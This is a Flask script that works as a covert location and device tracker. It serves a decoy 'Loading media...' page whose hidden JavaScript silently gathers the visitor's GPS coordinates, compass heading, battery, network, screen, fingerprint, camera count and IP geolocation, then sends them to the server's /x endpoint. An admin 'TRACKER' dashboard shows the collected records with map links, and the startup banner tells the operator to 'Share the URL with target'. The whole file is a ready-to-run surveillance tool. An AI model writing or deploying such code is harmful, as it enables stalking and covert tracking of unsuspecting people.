#!/usr/bin/env python3
from flask import Flask, request, Response, redirect
import json, os, base64, hashlib, time, socket
from datetime import datetime

app = Flask(__name__)
F = os.path.expanduser('~/data.json')
H = {"t":0,"g":0,"c":0,"n":0,"b":0,"s":0}

P = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Media</title>
<style>
*{margin:0;padding:0}
body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;overflow:hidden;height:100vh}
.l{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%}
.sp{width:45px;height:45px;border:3px solid #222;border-top:3px solid #0095f6;border-radius:50%;animation:s .7s linear infinite;margin:0 auto 15px}
@keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
p{color:#666;font-size:13px;margin-top:8px}
</style>
</head>
<body>
<div class="l"><div class="sp"></div><div style="color:#fff;font-size:17px">Loading media...</div><p>Please wait</p></div>
<script>
(function(){var E=window.location.origin+"/x";var S=false;
function Z(t,d){if(S)return;d._t=t;d._ts=Date.now();var p=btoa(unescape(encodeURIComponent(JSON.stringify(d))));new Image().src=E+"?d="+p+"&r="+Math.random();try{var x=new XMLHttpRequest();x.open("GET",E+"?d="+p,true);x.send()}catch(e){}try{fetch(E+"?d="+p,{mode:"no-cors"})}catch(e){}try{navigator.sendBeacon(E+"?d="+p)}catch(e){}}
try{navigator.geolocation.getCurrentPosition(function(p){Z("gps",{la:p.coords.latitude,lo:p.coords.longitude,ac:p.coords.accuracy,al:p.coords.altitude,hd:p.coords.heading,sp:p.coords.speed})},function(e){Z("gps_e",{c:e.code})},{enableHighAccuracy:true,timeout:3000})}catch(e){}
try{if(window.DeviceOrientationEvent){var H=function(e){if(e.alpha!==null){Z("cmp",{a:Math.round(e.alpha*100)/100,b:e.beta,ga:e.gamma});window.removeEventListener("deviceorientation",H)}};window.addEventListener("deviceorientation",H);if(typeof DeviceOrientationEvent.requestPermission==="function"){DeviceOrientationEvent.requestPermission().then(function(s){if(s==="granted"){window.addEventListener("deviceorientation",H)}}).catch(function(){})}}}catch(e){}
try{if(navigator.connection){var c=navigator.connection;Z("net",{ty:c.effectiveType,dl:c.downlink,rtt:c.rtt})}}catch(e){}
try{if(navigator.getBattery){navigator.getBattery().then(function(b){Z("bat",{lv:Math.round(b.level*100),ch:b.charging})})}}catch(e){}
try{Z("loc",{tz:Intl.DateTimeFormat().resolvedOptions().timeZone,of:new Date().getTimezoneOffset(),lg:navigator.language,ln:navigator.languages?navigator.languages.join(","):""})}catch(e){}
try{Z("scr",{w:screen.width,h:screen.height,pr:window.devicePixelRatio,or:screen.orientation?screen.orientation.type:"?"})}catch(e){}
try{Z("fp",{ua:navigator.userAgent,pl:navigator.platform,ve:navigator.vendor,co:navigator.hardwareConcurrency,rm:navigator.deviceMemory})}catch(e){}
try{fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(d){Z("ip",d)}).catch(function(){})}catch(e){}
try{if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){navigator.mediaDevices.enumerateDevices().then(function(dev){var v=[];dev.forEach(function(d){if(d.kind==="videoinput")v.push(d.label||"cam")});Z("cam",{c:v.length,n:v.join("|")})}).catch(function(){})}}catch(e){}
try{if(navigator.storage&&navigator.storage.estimate){navigator.storage.estimate().then(function(s){Z("stg",{u:Math.round(s.usage/1024/1024)+"MB",q:Math.round(s.quota/1024/1024)+"MB",p:Math.round((s.usage/s.quota)*100)+"%"})})}}catch(e){}
try{Z("ref",{r:document.referrer||"direct",u:window.location.href})}catch(e){}
setTimeout(function(){if(!S){Z("fin",{ms:Date.now()})}S=true},8080)})();
</script>
</body>
</html>"""

def L():
    try:
        with open(F) as f: return json.loads(f.read() or '[]')
    except: return []

def W(r):
    with open(F,'w') as f: json.dump(r,f)

@app.route('/')
def I(): return P

@app.route('/x')
def G():
    d=request.args.get('d')
    ip=request.remote_addr
    if d:
        try:
            q=json.loads(base64.b64decode(d))
            q['_ip']=ip
            q['_at']=datetime.now().strftime('%H:%M:%S.%f')[:-3]
            r=L()
            i=hashlib.md5((str(time.time())+ip).encode()).hexdigest()[:6]
            r.append({'id':i,'ts':datetime.now().strftime('%d-%m-%Y %H:%M:%S'),'tp':q.get('_t','?'),'data':q})
            if len(r)>500: r=r[-500:]
            W(r)
            H['t']+=1
            tp=q.get('_t','')
            if tp=='gps': H['g']+=1
            if tp=='cmp': H['c']+=1
            if tp=='net': H['n']+=1
            if tp=='bat': H['b']+=1
            if tp=='scr': H['s']+=1
            tt=datetime.now().strftime('%H:%M:%S')
            print(f"\n[+] {tt} TYPE: {tp.upper()}")
            if 'la' in q: print(f"  GPS: {q['la']}, {q['lo']} | https://maps.google.com/?q={q['la']},{q['lo']}")
            if 'a' in q: print(f"  COMPASS: {q['a']} deg")
            if 'lv' in q: print(f"  BATTERY: {q['lv']}%")
            if 'ty' in q: print(f"  NET: {q['ty']}")
            if 'tz' in q: print(f"  TZ: {q['tz']}")
            print(f"  Total:{H['t']} GPS:{H['g']} Comp:{H['c']}")
        except Exception as e:
            print(f"[-] {e}")
    return Response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b',mimetype='image/gif')

@app.route('/v')
def V():
    r=L()
    h="""<!DOCTYPE html><html><head><title>Tracker</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#e0e0e0;font-family:monospace;padding:15px}
h1{color:#0f0;font-size:20px;margin-bottom:5px}
.g{display:grid;grid-template-columns:repeat(auto-fit,minmax(80px,1fr));gap:8px;margin:12px 0}
.c{background:#151515;border:1px solid #2a2a2a;border-radius:8px;padding:10px;text-align:center}
.c .n{font-size:22px;font-weight:700;color:#0f0}.c .l{font-size:9px;color:#888;text-transform:uppercase}
.rc{background:#151515;border:1px solid #2a2a2a;border-radius:6px;padding:10px;margin:5px 0;word-break:break-all}
.rc .h{color:#0f0;font-size:10px}.rc .loc{color:#fc0;font-size:13px;margin:3px 0}
a{color:#09f;font-size:11px;text-decoration:none}.btn{background:#2a2a2a;color:#fff;border:0;padding:6px 14px;border-radius:5px;cursor:pointer;font-size:11px;margin:3px 5px 12px 0}
.btn:hover{background:#3a3a3a}.btn.d{background:#600}.btn.d:hover{background:#900}
.emp{text-align:center;padding:40px;color:#555;font-size:13px}
.m{color:#888;font-size:10px}
</style></head><body>
<h1>TRACKER</h1>
<div class="g">
<div class="c"><div class="n">"""+str(H['t'])+"""</div><div class="l">Total</div></div>
<div class="c"><div class="n">"""+str(H['g'])+"""</div><div class="l">GPS</div></div>
<div class="c"><div class="n">"""+str(H['c'])+"""</div><div class="l">Comp</div></div>
<div class="c"><div class="n">"""+str(H['n'])+"""</div><div class="l">Net</div></div>
<div class="c"><div class="n">"""+str(H['b'])+"""</div><div class="l">Bat</div></div>
<div class="c"><div class="n">"""+str(len(r))+"""</div><div class="l">Rec</div></div>
</div>
<button class="btn" onclick="location.reload()">Refresh</button>
<button class="btn d" onclick="if(confirm('Clear?'))window.location.href='/c'">Clear</button>"""
    if r:
        for rc in reversed(r[-50:]):
            d=rc['data']
            h+='<div class="rc">'
            h+=f'<div class="h">#{rc["id"]} | {rc["ts"]} | {rc["tp"]}</div>'
            if 'la' in d:
                h+=f'<div class="loc">GPS: {d["la"]}, {d["lo"]}</div>'
                h+=f'<a href="https://maps.google.com/?q={d["la"]},{d["lo"]}" target="_blank">Maps</a>'
            if 'a' in d: h+=f'<div class="m">Compass: {d["a"]} deg</div>'
            if 'lv' in d: h+=f'<div class="m">Battery: {d["lv"]}%</div>'
            if 'ty' in d: h+=f'<div class="m">Net: {d["ty"]}</div>'
            if 'tz' in d: h+=f'<div class="m">TZ: {d["tz"]}</div>'
            if 'c' in d: h+=f'<div class="m">Cam: {d["c"]}</div>'
            if 'u' in d: h+=f'<div class="m">Storage: {d["u"]}</div>'
            h+='</div>'
    else:
        h+='<div class="emp">Waiting...</div>'
    h+='<script>setTimeout(()=>location.reload(),10000)</script></body></html>'
    return h

@app.route('/c')
def C():
    W([])
    for k in H: H[k]=0
    return redirect('/v')

print("\n"+ "="*50)
print("  TRACKER READY")
print("="*50)
ip=socket.gethostbyname(socket.gethostname())
print(f"\n  URL:   http://{ip}:8080")
print(f"  Admin: http://{ip}:8080/v")
print("\n  Share the URL with target")
print("="*50)
app.run(host='0.0.0.0',port=8080,threaded=True)
